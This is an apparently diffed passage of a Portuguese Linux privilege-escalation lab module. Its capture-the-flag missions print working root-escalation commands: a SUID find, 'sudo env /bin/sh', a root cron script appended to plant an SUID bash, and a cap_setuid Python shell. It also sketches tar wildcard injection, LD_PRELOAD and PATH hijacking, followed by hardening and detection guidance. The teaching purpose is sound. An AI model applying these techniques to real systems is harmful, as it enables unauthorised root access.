+O `euid=0` é o que importa: o kernel te trata como root. O `cat` imprime a flag que você definiu para `flag_suid.txt`. Lição: um SUID root fora do padrão é código de root a seu dispor — e o `-p` é o que impede o `bash`/`sh` de largar o privilégio.
+</Solution>
+
+<FlagInput task="missao-1-suid" />
+
+### 5.3 Missão 2 — Root por uma regra de sudo (desafio)
+
+Nem sempre há um SUID solto. O `sudo` é a segunda parada. Descubra o que você pode rodar como root e transforme isso num shell. Objetivo: virar root e ler `/root/flag_sudo.txt`.
+
+<Hint title="Dica 1 — o que o sudo te dá">
+`sudo -l` lista suas permissões. Aqui ele mostra uma única regra, com `NOPASSWD` (nem senha pede). O programa liberado parece inofensivo.
+</Hint>
+
+<Hint title="Dica 2 — o escape">
+Esse programa está no GTFOBins, seção **Sudo**. Ele executa um comando que você passa depois do nome dele. Peça a ele um `/bin/sh`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ sudo -l
+    (root) NOPASSWD: /usr/bin/env
+$ sudo env /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/flag_sudo.txt
+```
+
+O `env` roda o comando que vem depois dele — e o `sudo` o roda como root. Aqui o `uid` real é 0 (root pleno, não só efetivo). Lição: dar `NOPASSWD` a um binário que executa outros programas é dar root.
+</Solution>
+
+<FlagInput task="missao-2-sudo" />
+
+### 5.4 Missão 3 — Root por um cron de root (desafio)
+
+Agora o vetor que mais parece mágica: fazer o **root trabalhar para você**. Há uma tarefa agendada rodando como root. Seu objetivo é fazer o root, na próxima execução, te deixar um caminho para `uid=0`, e então ler `/root/flag_cron.txt`.
+
+<Hint title="Dica 1 — o cruzamento">
+Olhe `/etc/cron.d/`. A tarefa roda como `root` e executa um script. Agora veja as permissões desse script (`ls -l`). Ele é `rwxrwxrwx` — <GlossaryTerm term="world-writable">world-writable</GlossaryTerm>. Você controla o conteúdo; o root fornece o poder.
+</Hint>
+
+<Hint title="Dica 2 — o que escrever">
+Acrescente ao script um comando que, rodando como root, deixe uma cópia do `/bin/bash` com o bit SUID ligado — por exemplo copiar para `/tmp/rootbash` e dar `chmod 4755`. Depois espere até um minuto e rode `/tmp/rootbash -p`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ cat /etc/cron.d/healthcheck
+* * * * * root /opt/maint/healthcheck.sh
+$ ls -l /opt/maint/healthcheck.sh
+-rwxrwxrwx 1 root root 38 ... /opt/maint/healthcheck.sh
+$ printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' >> /opt/maint/healthcheck.sh
+```
+
+Espere a virada do minuto e confirme que o root criou o `rootbash` SUID:
+
+```console
+$ ls -l /tmp/rootbash
+-rwsr-xr-x 1 root root 1298416 ... /tmp/rootbash
+$ /tmp/rootbash -p
+$ id
+uid=1000(app) gid=1000(app) euid=0(root) groups=1000(app)
+$ cat /root/flag_cron.txt
+```
+
+Lição: você nunca atacou o `cron`; atacou o que ele executa. Um script de root gravável por você é um dos vetores mais confiáveis e silenciosos que existem — exatamente a prioridade que o 6.2 ensinou.
+</Solution>
+
+<FlagInput task="missao-3-cron" />
+
+### 5.5 Missão 4 — Root por uma capability (desafio)
+
+O último caminho não é SUID, nem `sudo`, nem `cron`: é uma file capability perigosa escondida num binário comum. Objetivo: encontrá-la, virar root e ler `/root/flag_cap.txt`.
+
+<Hint title="Dica 1 — enxergar a capability">
+`getcap -r / 2>/dev/null` lista os binários com file capabilities. Um deles tem `cap_setuid` — o pedaço do root que permite trocar o próprio uid (releia a 2.4). Repare no nome: é uma cópia de um interpretador.
+</Hint>
+
+<Hint title="Dica 2 — usar a capability">
+Com um interpretador que carrega `cap_setuid`, você pode pedir `setuid(0)` e depois abrir um shell. Em python: `import os; os.setuid(0); os.system("/bin/sh")`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ getcap -r / 2>/dev/null
+/usr/local/bin/pythoncap cap_setuid=ep
+$ /usr/local/bin/pythoncap -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=1000(app) groups=1000(app)
+# cat /root/flag_cap.txt
+```
+
+Lição: uma capability é root fatiado. `cap_setuid` num binário que roda código seu é tão grave quanto um SUID root — e some da lista de `find -perm -4000`, por isso o `getcap` é obrigatório na enumeração.
+</Solution>
+
+<FlagInput task="missao-4-capability" />
+
+### 5.6 Desligar e limpar
+
+Saia do shell do contêiner (`exit`, repetindo se tiver aberto shells aninhados). Como você subiu com `--rm`, o contêiner **desaparece sozinho** ao parar — nada fica no seu sistema. Se quiser apagar também a imagem de treino:
+
+```console
+$ docker rmi privesc-lab:local
+```
+
+## 6. Variações e aprofundamento
+
+**SUID shell-script vs. binário.** Kernels Linux modernos **ignoram** o bit SUID em *scripts* (arquivos com `#!`), justamente porque eram fáceis demais de abusar; o SUID só vale para binários. Por isso o vetor da missão 1 usa um binário (`find`), e o do `cron` (missão 3) cria um binário SUID (a cópia do `bash`), não um script.
+
+**sudo e o ambiente: `LD_PRELOAD`.** Se o `sudoers` preserva variáveis de ambiente perigosas (um `Defaults env_keep += "LD_PRELOAD"`), abre-se outro caminho: o <GlossaryTerm term="LD_PRELOAD">LD_PRELOAD</GlossaryTerm> força o carregamento de uma biblioteca sua **dentro** do processo que o `sudo` roda como root — e o seu código (na função `_init` ou num construtor) executa como root. É um lembrete de que a superfície do `sudo` inclui o ambiente que ele deixa passar, não só o comando.
+
+**cron e curingas: `wildcard injection`.** Um clássico perigoso é um `cron` de root que roda algo como `tar -czf backup.tar.gz *` num diretório onde você escreve. O `*` expande para os nomes dos arquivos **que você criou** — e se você criar arquivos chamados `--checkpoint=1` e `--checkpoint-action=exec=sh runme.sh`, o `tar` os interpreta como **opções**, não como nomes, e executa o seu `runme.sh` como root. Essa é a <GlossaryTerm term="wildcard injection">wildcard injection</GlossaryTerm>: o curinga não distingue "nome de arquivo" de "opção". `tar`, `chown`, `rsync` e `7z` têm variações conhecidas.
+
+**capabilities além de `cap_setuid`.** `cap_dac_override` (ignora as permissões de arquivo) e `cap_dac_read_search` (ignora as de leitura) num binário que lê arquivos deixam você **ler o `/etc/shadow`** e levar os hashes para quebra offline (a ponte com o 3.2 e o 5.5). `cap_setuid` dá shell; as de `dac` dão leitura — vetores diferentes para objetivos diferentes.
+
+**`PATH` e binários relativos.** Se um script de root (via `cron` ou `sudo`) chama um programa pelo nome, sem caminho absoluto (`tar` em vez de `/usr/bin/tar`), e você controla o <GlossaryTerm term="PATH environment variable">`PATH`</GlossaryTerm> com que ele roda, pode colocar um `tar` falso seu na frente. É a <GlossaryTerm term="PATH hijacking">PATH hijacking</GlossaryTerm>, prima do vetor de `cron`.
+
+**"Estou num contêiner?"** Como no 6.2: root **dentro** de um contêiner não é root no host. No nosso treino isso é o que garante a segurança. Num engajamento real, virar root num contêiner é só mais um degrau — escapar para o host é outra escalação (montagens indevidas, `docker.sock`, capabilities excessivas do contêiner).
+
+## 7. Erros comuns
+
+- **`/bin/sh` cai de volta para o usuário comum.** Faltou o `-p`. Sem ele, o `bash`/`sh` baixa o `euid` ao uid real na inicialização. Use `/bin/sh -p` (seção 2.1).
+- **"O SUID não eleva nada" (euid continua o seu).** O contêiner (ou o host) pode estar com <GlossaryTerm term="no-new-privileges">`no-new-privileges`</GlossaryTerm>, que faz o kernel ignorar o bit SUID. É defesa, não bug — veja a seção 8.
+- **O `cron` não dispara.** Confirme que o daemon está rodando (`pgrep cron`) e que a linha em `/etc/cron.d/` tem o campo de **usuário** (`root`) e termina em nova linha. No nosso alvo o `entrypoint.sh` liga o `cron`; se você subiu o contêiner de outro jeito, o `cron` pode não ter iniciado.
+- **Editei o script errado (ou um não executável).** Cheque qual script o `cron` chama e se ele é mesmo gravável por você (`ls -l`). Um script de root `-rwxr-xr-x` (755) **não** é vetor: você não pode reescrevê-lo.
+- **`sudo` pede senha.** Então não há `NOPASSWD` para o seu comando, ou você mirou o comando errado — releia o `sudo -l` com atenção (o alvo da regra e o usuário de destino).
+- **`getcap` não existe.** Está no pacote `libcap2-bin`. No alvo de treino ele já vem; num alvo real sem `getcap`, dá para ler as capabilities por outros meios, mas comece conferindo o `PATH`.
+
+## 8. Defesa e mitigação
+
+A outra metade da visão completa: como fechar os quatro vetores. Quem defende um host Linux trata cada um como um item de inventário.
+
+**Inventarie e enxugue os SUID/SGID.** Liste o que é SUID e questione cada item fora do padrão:
+
+```console
+$ find / -perm -4000 -type f 2>/dev/null
+```
+
+Binários que não precisam do bit perdem o bit (`chmod u-s`). Monte partições de dados com a opção `nosuid` no `/etc/fstab`, para que nenhum SUID ali tenha efeito. A regra é o <GlossaryTerm term="principle of least privilege">princípio do menor privilégio</GlossaryTerm>: um SUID root só existe se for mesmo indispensável.
+
+**`sudoers` mínimo, e cuidado com o que o comando sabe fazer.** Nunca delegue por `sudo` um editor, um pager ou um binário que executa outros programas (`env`, `find`, `awk`, `vim`, `less`...). Prefira um comando específico e sem escape. Exemplo do que **não** fazer e do caminho seguro:
+
+```text
+# RUIM: env executa qualquer coisa como root, sem senha.
+app ALL=(root) NOPASSWD: /usr/bin/env
+
+# MELHOR: um comando específico, que não abre shell, e com senha.
+app ALL=(root) /usr/sbin/service nginx reload
+```
+
+Evite `NOPASSWD` quando possível, desconfie de `env_keep` (nunca preserve `LD_PRELOAD`/`LD_LIBRARY_PATH`), e **mantenha o `sudo` atualizado** — o Baron Samedit mostrou que a versão do `sudo` é um controle de segurança por si só. Distribuições modernas vêm migrando para o `sudo-rs` (reescrita em Rust) para reduzir bugs de memória como aquele.
+
+**`cron`/timers de root só com scripts blindados.** Todo script executado por root a partir do `cron` ou de um `systemd` timer deve ser **de root e não gravável por mais ninguém** (`root:root`, `755` ou mais restrito), com caminho **absoluto** e `PATH` fixo dentro do script. Nada de diretórios world-writable no caminho. Audite com:
+
+```console
+$ find / -path /proc -prune -o -perm -o+w -type f -print 2>/dev/null
+```
+
+e cruze os achados com o que o `cron` executa — é a mesma varredura do 6.2, agora do lado de quem defende.
+
+**Capabilities sob rédea curta.** Dê a um binário só a capability de que ele precisa, e nunca `cap_setuid`/`cap_setgid`/`cap_dac_override` a algo que rode código arbitrário. Audite periodicamente:
+
+```console
+$ getcap -r / 2>/dev/null
+```
+
+**A defesa que mata quase todos de uma vez: `no-new-privileges`.** Um processo marcado com `no-new-privileges` (e seus filhos) não pode **ganhar** privilégio num `execve`: o kernel ignora o bit SUID e as file capabilities. É a configuração padrão de contêineres bem feitos e de muitas unidades `systemd` (`NoNewPrivileges=yes`). Veja a diferença, no nosso próprio alvo, com a opção ligada:
+
+```console
+$ docker run --rm --network none --security-opt no-new-privileges \
+    -u app --entrypoint /usr/local/bin/find privesc-lab:local . -maxdepth 0 -exec id \;
+uid=1000(app) gid=1000(app) groups=1000(app)
+```
+
+O SUID `find` rodou — mas **não elevou**: o `euid` continuou 1000. O vetor simplesmente deixou de existir. É por isso que o `linux-sandbox` da Trilha 0, que roda com `no-new-privileges` e `cap_drop: ALL`, não serve para praticar escalação: ele foi endurecido de propósito.
+
+**Detecção.** Um `find / -perm -4000` ou um `getcap -r /` partindo de uma conta de serviço, a edição de um script de `cron`, ou um `sudo` seguido de `/bin/sh` são padrões que o `auditd` e ferramentas de EDR reconhecem como *Privilege Escalation* no MITRE ATT&CK (tática TA0004). Monitorar a **mudança** de scripts de `cron` e a criação de binários SUID em `/tmp` pega os vetores 1 e 3 em flagrante.
+
+## 9. Exercícios
+
+Primeiro, o quiz de teoria (ele conta para concluir o módulo):
+
+<Quiz task="quiz-final" />
+
+Depois, os desafios práticos — as quatro missões da seção 5, cada uma com sua flag:
+
+- **Missão 1 — SUID:** abra um shell `euid=0` pelo `find` SUID e leia `/root/flag_suid.txt`.
+- **Missão 2 — sudo:** vire root pela regra `NOPASSWD` e leia `/root/flag_sudo.txt`.
+- **Missão 3 — cron:** faça o `cron` de root te dar um `/tmp/rootbash` SUID e leia `/root/flag_cron.txt`.
+- **Missão 4 — capability:** use o `cap_setuid` para assumir o `uid 0` e leia `/root/flag_cap.txt`.
+
+Para ir além, sem flag: no alvo de treino, **feche** um dos vetores (tire o bit SUID do `find`, ou troque a regra do `sudo`, ou blinde o script do `cron`, ou remova a capability) e confirme que o caminho correspondente deixou de funcionar. Defender é a melhor forma de provar que entendeu o ataque.
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- O bit **SUID** faz o `euid` do processo virar o dono do arquivo; um SUID root que execute código seu é root a seu dispor. O `-p` impede o shell de largar o privilégio.
+- **sudo** delega poder; o risco é delegar um binário que executa outros programas (shell escape, catalogado no GTFOBins) — e o próprio `sudo`, sendo SUID root, pode ter bugs (Baron Samedit).
+- **cron** executa, como root, o que a tabela manda; se o script é gravável por você, o root roda o seu código sozinho. É o vetor mais confiável e silencioso.
+- **capabilities** fatiam o root; `cap_setuid` num binário que roda código seu é root disfarçado, invisível ao `find -perm -4000` e visível ao `getcap`.
+- Do lado da defesa: enxugar SUID, `sudoers` mínimo e atualizado, scripts de `cron` blindados, capabilities sob rédea — e `no-new-privileges`, que mata a família SUID/capability de uma vez.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [GTFOBins](https://gtfobins.github.io/) — o catálogo de binários Unix que viram escalação quando SUID, via `sudo` ou com capabilities. A referência das quatro missões.
+- [capabilities(7) — manual do Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html) — a lista completa das Linux capabilities e o que cada uma permite.
+- [Sudo advisory — CVE-2021-3156 (Baron Samedit)](https://www.sudo.ws/security/advisories/unescape_overflow/) — o relatório oficial do caso da seção 4.
